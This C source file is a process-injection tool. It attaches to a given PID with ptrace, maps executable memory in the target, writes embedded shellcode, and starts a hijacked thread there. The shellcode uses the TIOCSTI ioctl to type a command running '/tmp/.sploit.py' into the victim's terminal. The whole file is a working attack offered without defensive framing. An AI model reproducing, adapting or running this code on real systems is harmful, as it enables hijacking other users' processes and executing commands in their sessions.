#define _GNU_SOURCE

#include <unistd.h> 
#include <errno.h>
#include <stdio.h>
#include <sched.h> 
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include "utils.h"

#define SHELL_LEN 1024
char *shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x22\x48\x31\xff\x5a\x68\x12\x54\x00\x00\x5e\x6a\x10\x58\x0f\x05\x48\xff\xc2\x0f\xbe\x1a\x85\xdb\x75\xf1\x6a\x3c\x58\x48\x31\xff\x0f\x05\xff\xe8\xd9\xff\xff\xff\x20\x2f\x74\x6d\x70\x2f\x2e\x73\x70\x6c\x6f\x69\x74\x2e\x70\x79\x0a\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

#define FLAGS_PROCESS 	(1<<0)
#define FLAGS_DIRECT 	(1<<1)

void usage(const char *name)
{
	
	fprintf(stderr, "\tUsage: %s PID\n", name);
	exit(0);
}

int poke_text(pid_t pid, size_t addr, char *buf, size_t blen)
{
	int i = 0;
	char *ptr = malloc(blen + blen % sizeof(size_t));	// word align
	memcpy(ptr, buf, blen);

	for (i = 0; i < blen; i += sizeof(size_t)) 
	{
		if (ptrace(PTRACE_POKETEXT, pid, addr + i, *(size_t *)&ptr[i]) < 0)
		{
			logs(LOG_ERROR, "%s: %s", "ptrace POKE", strerror(errno));
			exit(1);
		}
	}
	free(ptr);
	return 0;
}

int peek_text(pid_t pid, size_t addr, char *buf, size_t blen)
{
	int i = 0;
	size_t word = 0;
	for (i = 0; i < blen; i += sizeof(size_t)) 
	{
		word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL);
		memcpy(&buf[i], &word, sizeof(word));
	}
	return 0;
}

void remote_jmp(pid_t pid, void *addr)
{
	struct user_regs_struct regs;
	
	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		exit(1);
	}
	
	regs.rip = (uint64_t) addr;

	if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		exit(1);
	}
}

uint64_t remote_syscall(pid_t pid, uint64_t rax, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t r10, uint64_t r8, uint64_t r9)
{
	struct user_regs_struct regs, return_regs;

	char saved_text[sizeof(size_t)];
   	char *syscall_opt = "\x0f\x05";
	int syscall_len = 2;

	// save	orginal regs
	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		exit(1);
	}

	// prepare regs for call
	memcpy(&return_regs, &regs, sizeof(struct user_regs_struct));
	return_regs.rax = rax;
	return_regs.rdi = rdi;
	return_regs.rsi = rsi;
	return_regs.rdx = rdx;
	return_regs.r10 = r10;
	return_regs.r8 = r8;
	return_regs.r9 = r9;

	peek_text(pid, regs.rip, saved_text, sizeof(size_t));

	// load syscall
	if (ptrace(PTRACE_SETREGS, pid, NULL, &return_regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		exit(1);
	}
	poke_text(pid, regs.rip, syscall_opt, syscall_len);

	// exec
	if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SINGLESTEP", strerror(errno));
		exit(1);
	}
	waitpid(pid, NULL, 0);
	
	// get return val
	if (ptrace(PTRACE_GETREGS, pid, NULL, &return_regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		exit(1);
	}

	// restore orginal
	if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		exit(1);
	}
	poke_text(pid, regs.rip, saved_text, sizeof(size_t));

	return return_regs.rax;
}

// some remote syscalls prototypes
void *remote_mmap(pid_t pid, void *addr, size_t len, int prot, int flags, int fd, off_t offset)
{
	return (void *) remote_syscall(pid, SYS_mmap, (uint64_t)addr, (uint64_t)len, (uint64_t)prot, (uint64_t)flags, (uint64_t) fd, (uint64_t) offset);
}

void *remote_mprotect(pid_t pid, void *addr, size_t len, int prot)
{
	return (void *) remote_syscall(pid, SYS_mprotect, (uint64_t)addr, (uint64_t)len, (uint64_t)prot, (uint64_t) NULL, (uint64_t) NULL, (uint64_t) NULL);
}

int  remote_write(pid_t pid, int fd, const void *buf, size_t count)
{
	return (int) remote_syscall(pid, SYS_write, (uint64_t) fd, (uint64_t) buf, (uint64_t) count, (uint64_t) NULL,(uint64_t) NULL, (uint64_t) NULL);
}

uint64_t remote_clone(pid_t pid, int flags, void *child_stack)
{
	return remote_syscall(pid, SYS_clone, (uint64_t)flags, (uint64_t)child_stack, (uint64_t) NULL, (uint64_t) NULL,(uint64_t) NULL,(uint64_t) NULL);
}

int main(int argc, char *argv[])
{
	struct user_regs_struct sregs;
	pid_t pid;
   	int wstatus, opt, flags=0;
	bool main_arg = false;
	
	
	if (argc != 2)
	{
		usage(argv[0]);
	}
	pid = (pid_t)atoi(argv[1]);

	// main functionality
	logs(LOG_DEBUG, "attaching to proccess (id: %d)", pid);
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace", strerror(errno));
		exit(1);
	}
	waitpid(pid, &wstatus, 0);

	if (ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESYSGOOD) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace_setoptions", strerror(errno));
		exit(1);
	}

	logs(LOG_DEBUG, "mmaping shellcode and stack");
	void *mem_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
	logs(LOG_DEBUG, "mem_addr: %p", mem_addr);
	void *stack_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
	logs(LOG_DEBUG, "stack_addr: %p", mem_addr);
	void *stack_top = stack_addr + 4096;
	pid_t ret_pid;

	logs(LOG_DEBUG, "copying shellcode (%d bytes)", SHELL_LEN);
	poke_text(pid, (size_t) mem_addr, shellcode, SHELL_LEN);	

	logs(LOG_DEBUG, "setting up child's stack");
	poke_text(pid, (size_t) stack_addr, (char *)&mem_addr, sizeof(void *));	

	// spawn thread
	logs(LOG_DEBUG, "starting new thead");
	ret_pid = remote_clone(pid, CLONE_PTRACE | CLONE_SIGHAND | CLONE_THREAD | CLONE_VM | CLONE_FS | CLONE_FILES, stack_top);
	waitpid(ret_pid, &wstatus, 0);
	logs(LOG_DEBUG, "thread id: %d", ret_pid);

	logs(LOG_DEBUG, "setting rip in thread");
	// +2 is a failsafe because resuming may rewind RIP in some cases, dont forget to nopsledge the shellcode for that matter
	remote_jmp(ret_pid, mem_addr + 2);

	logs(LOG_DEBUG, "detaching main process");
	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0){
		logs(LOG_ERROR, "%s: %s", "ptrace DETACH", strerror(errno));
		exit(1);
	}
	
	logs(LOG_DEBUG, "detaching from thread");
	if (ptrace(PTRACE_DETACH, ret_pid, NULL, NULL) < 0){
		logs(LOG_ERROR, "%s: %s", "ptrace DETACH", strerror(errno));
		exit(1);
	}

	logs(LOG_DEBUG, "done");

	return 0;
}
